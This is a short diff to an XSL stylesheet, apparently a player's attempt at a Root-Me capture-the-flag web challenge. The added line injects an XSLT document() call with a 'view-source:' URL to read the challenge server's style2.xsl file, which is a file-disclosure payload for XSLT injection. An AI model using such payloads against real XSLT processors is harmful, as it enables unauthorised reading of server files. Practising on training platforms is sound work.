@@ -9,7 +9,7 @@
   <div style="margin-left:20px;margin-bottom:1em;font-size:10pt">
     <p>
     <xsl:value-of select="description"/>
-    <span > (<xsl:value-of select='document("style2.xsl")'/> %)</span>
+    <span > INJECT STYLE 2 ??? => (<xsl:value-of select='document("view-source:http://challenge01.root-me.org/web-serveur/ch50/style2.xsl")'/> %)</span>
 	    
     </p>
   </div>
